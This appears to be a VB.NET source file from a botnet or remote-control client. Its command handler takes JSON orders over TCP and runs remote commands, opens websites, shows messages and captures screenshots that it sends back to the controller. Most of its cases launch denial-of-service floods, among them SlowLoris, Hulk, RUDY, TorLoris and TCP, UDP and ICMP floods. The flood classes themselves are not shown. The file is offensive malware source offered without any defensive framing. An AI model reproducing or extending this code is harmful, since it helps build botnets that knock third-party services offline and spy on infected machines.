Imports System.Net.Sockets
Imports Newtonsoft.Json

Namespace Alduin.Stump.Class.Commands
    Public Class CommandHandler : Implements ICommand
        Public Sub New()

        End Sub
        Public Function CommandHandler(ByVal request As String, ByVal client As TcpClient) As String
            Dim method As String = JsonMethodSelector(request) 'Handle TCP request
            Select Case method
                Case "Execute"
                    Dim ModelDes As ExecuteModel = JsonConvert.DeserializeAnonymousType(request, New ExecuteModel)
                    Return ExecuteCommand.Handler(ModelDes)
                Case "Website"
                    Dim ModelDes As WebsiteOpenModel = JsonConvert.DeserializeAnonymousType(request, New WebsiteOpenModel)
                    Return OpenWebsiteCommand.Handler(ModelDes)
                Case "Message"
                    Dim ModelDes As MessageModel = JsonConvert.DeserializeAnonymousType(request, New MessageModel)
                    Return MessageCommand.Handler(ModelDes)
                Case "Arme"
                    Dim ModelDes As ArmeModel = JsonConvert.DeserializeAnonymousType(request, New ArmeModel)
                    GetFloodsBase().Reset()
                    Dim attack As ARME = New ARME(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "SlowLoris"
                    Dim ModelDes As SlowLorisModel = JsonConvert.DeserializeAnonymousType(request, New SlowLorisModel)
                    GetFloodsBase().Reset()
                    Dim attack As SlowLoris = New SlowLoris(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "HttpBandWidth"
                    Dim ModelDes As HttpBandWidthModel = JsonConvert.DeserializeAnonymousType(request, New HttpBandWidthModel)
                    GetFloodsBase().Reset()
                    Dim attack As HttpBandWidth = New HttpBandWidth(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Hulk"
                    Dim ModelDes As HulkModel = JsonConvert.DeserializeAnonymousType(request, New HulkModel)
                    GetFloodsBase().Reset()
                    Dim attack As Hulk = New Hulk(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "TorLoris"
                    Dim ModelDes As TorLorisModel = JsonConvert.DeserializeAnonymousType(request, New TorLorisModel)
                    GetFloodsBase().Reset()
                    Dim attack As TorLoris = New TorLoris(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Rudy"
                    Dim ModelDes As RudyModel = JsonConvert.DeserializeAnonymousType(request, New RudyModel)
                    GetFloodsBase().Reset()
                    Dim attack As Rudy = New Rudy(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Tcp"
                    Dim ModelDes As TcpModel = JsonConvert.DeserializeAnonymousType(request, New TcpModel)
                    GetFloodsBase().Reset()
                    Dim attack As TCP = New TCP(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Udp"
                    Dim ModelDes As UdpModel = JsonConvert.DeserializeAnonymousType(request, New UdpModel)
                    GetFloodsBase().Reset()
                    Dim attack As UDP = New UDP(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Icmp"
                    Dim ModelDes As ICMPModel = JsonConvert.DeserializeAnonymousType(request, New ICMPModel)
                    GetFloodsBase().Reset()
                    Dim attack As ICMP = New ICMP(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "GetAllImgJson"
                    Return AllImgToJson.Handler()
                Case "GetImg"
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
            End Select
            Dim url As String = RequestSplitter(request) ' Handle HTTP request
            Select Case url
                Case "Forbidden"
                    Return "Forbidden"
                Case "GetScreenShot"
                    StreamWriterImg(TakeScreenShot.TakeScreenShot(), client)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
            End Select
            Return "Command execute Failed!"
        End Function
        Public Function JsonMethodSelector(ByVal request As String) As String
            Dim method As String = ""
            For i = request.IndexOf("Method") To request.Length - 1
                If request.Chars(i) = "}" Or request.Chars(i) = "," Then
                    Exit For
                End If
                method += request.Chars(i)
            Next
            method = method.Replace("""", "").Replace(":", "").Replace(" ", "").Replace(",", "").Replace("Method", "")
            Return method
        End Function
        Public Function RequestSplitter(ByVal model As String)
            Dim header As String() = model.Split(New Char() {" "c})
            Dim splitUrl As String() = header(1).Split(New Char() {"/"c})
            If splitUrl(0) = Main.Config.Variables.CertifiedKey Then
                Return splitUrl(1)
            Else
                Return "Forbidden"
            End If
        End Function
    End Class
End Namespace


